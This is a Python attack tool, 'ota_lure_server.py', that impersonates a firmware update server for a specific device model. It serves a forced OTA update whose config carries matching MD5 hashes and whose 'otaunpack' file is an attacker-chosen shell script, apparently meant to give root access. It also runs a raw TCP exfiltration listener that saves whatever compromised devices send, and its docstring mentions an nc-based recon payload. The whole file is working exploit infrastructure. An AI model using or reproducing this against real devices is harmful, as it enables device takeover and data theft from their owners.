#!/usr/bin/env python3
"""OTA lure HTTP server + exfiltration listener.

Serves the three files the device's OTA client asks for and logs every
request.  `config.txt` is generated from the payload so the MD5 values always
match what is actually served.

    python3 ota_lure_server.py --payload ../payloads/otaunpack_root_boa.sh

The device requests paths like
    /ota/rgl/sd203_6710_yro8__SSW105AT/config.txt
so lookups fall back to the basename when the exact path is not present.

A second TCP listener dumps whatever a payload sends to it (handy for the
recon payload that pipes `nc` into the host).
"""
import argparse
import gzip
import hashlib
import os
import shutil
import socket
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

STATE = {"root": ".", "log": "access.log", "exfil": "exfil"}


def md5_file(path):
    h = hashlib.md5()
    with open(path, "rb") as fh:
        for chunk in iter(lambda: fh.read(1 << 20), b""):
            h.update(chunk)
    return h.hexdigest()


def write_config(root, major, middle, minor, small, force, release):
    fw = os.path.join(root, "sd203ota.bin.gz")
    if not os.path.exists(fw):
        with open(fw, "wb") as fh:
            fh.write(gzip.compress(b"placeholder"))
    ota = os.path.join(root, "otaunpack")
    if not os.path.exists(ota):
        raise SystemExit("missing otaunpack payload in %s" % root)
    cfg = [
        "suffix_version=V2",
        "major_version=%s" % major,
        "middle_version=%s" % middle,
        "minor_version=%s" % minor,
        "small_version=%s" % small,
        "release_date=%s" % release,
        "force_update=%s" % ("true" if force else "false"),
        "MD5=%s" % md5_file(fw),
        "MD5_OTA=%s" % md5_file(ota),
    ]
    path = os.path.join(root, "config.txt")
    with open(path, "w", newline="\r\n") as fh:
        fh.write("\r\n".join(cfg) + "\r\n")
    return path


def log(msg):
    line = "%s %s" % (time.strftime("%Y-%m-%d %H:%M:%S"), msg)
    with open(STATE["log"], "a", encoding="utf-8", errors="replace") as fh:
        fh.write(line + "\n")
    print(line, flush=True)


class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.0"
    server_version = "ota-lure"

    def log_message(self, fmt, *args):
        pass

    def _record(self, body=b""):
        log("REQ %s %s from %s:%s ua=%r len=%d" % (
            self.command, self.path, self.client_address[0],
            self.client_address[1], self.headers.get("User-Agent"), len(body)))
        for k, v in self.headers.items():
            log("    %s: %s" % (k, v))
        if body:
            os.makedirs(STATE["exfil"], exist_ok=True)
            fn = os.path.join(STATE["exfil"], "body-%d.bin" % int(time.time() * 1000))
            with open(fn, "wb") as fh:
                fh.write(body)
            log("    body -> %s (%d bytes)" % (fn, len(body)))

    def _resolve(self):
        path = self.path.split("?", 1)[0].lstrip("/")
        root = STATE["root"]
        cand = os.path.normpath(os.path.join(root, path))
        if cand.startswith(os.path.abspath(root)) and os.path.isfile(cand):
            return cand
        base = os.path.basename(path.rstrip("/"))
        if base:
            cand = os.path.join(root, base)
            if os.path.isfile(cand):
                return cand
        return None

    def do_GET(self):
        self._record()
        full = self._resolve()
        if not full:
            self.send_response(404)
            self.send_header("Content-Length", "0")
            self.end_headers()
            return
        with open(full, "rb") as fh:
            data = fh.read()
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_POST(self):
        n = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(n) if n else b""
        self._record(body)
        self.send_response(200)
        self.send_header("Content-Length", "2")
        self.end_headers()
        self.wfile.write(b"ok")


def raw_listener(port):
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port))
    srv.listen(5)
    log("raw listener on 0.0.0.0:%d" % port)
    while True:
        conn, addr = srv.accept()
        log("RAW connect from %s:%s" % addr)
        conn.settimeout(5)
        data = b""
        try:
            while True:
                chunk = conn.recv(65536)
                if not chunk:
                    break
                data += chunk
        except Exception:
            pass
        os.makedirs(STATE["exfil"], exist_ok=True)
        fn = os.path.join(STATE["exfil"], "raw-%d.bin" % int(time.time() * 1000))
        with open(fn, "wb") as fh:
            fh.write(data)
        log("RAW %d bytes -> %s" % (len(data), fn))
        conn.close()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--root", default="lure")
    ap.add_argument("--payload", help="shell script to serve as otaunpack")
    ap.add_argument("--major", default="1")
    ap.add_argument("--middle", default="0")
    ap.add_argument("--minor", default="3")
    ap.add_argument("--small", default="R")
    ap.add_argument("--release", default=time.strftime("%Y-%m-%d"))
    ap.add_argument("--force", action="store_true", default=True)
    ap.add_argument("--port", type=int, default=8000)
    ap.add_argument("--exfil-port", type=int, default=9001)
    args = ap.parse_args()

    os.makedirs(args.root, exist_ok=True)
    STATE["root"] = os.path.abspath(args.root)
    STATE["log"] = os.path.join(STATE["root"], "access.log")
    STATE["exfil"] = os.path.join(STATE["root"], "exfil")

    if args.payload:
        dest = os.path.join(STATE["root"], "otaunpack")
        shutil.copyfile(args.payload, dest)
        os.chmod(dest, 0o755)
        print("payload: %s -> %s" % (args.payload, dest))

    cfg = write_config(STATE["root"], args.major, args.middle, args.minor,
                       args.small, args.force, args.release)
    print("config: %s" % cfg)
    with open(cfg) as fh:
        print(fh.read().rstrip())

    threading.Thread(target=raw_listener, args=(args.exfil_port,), daemon=True).start()
    httpd = ThreadingHTTPServer(("0.0.0.0", args.port), Handler)
    log("http listener on 0.0.0.0:%d root=%s" % (args.port, STATE["root"]))
    httpd.serve_forever()


if __name__ == "__main__":
    main()
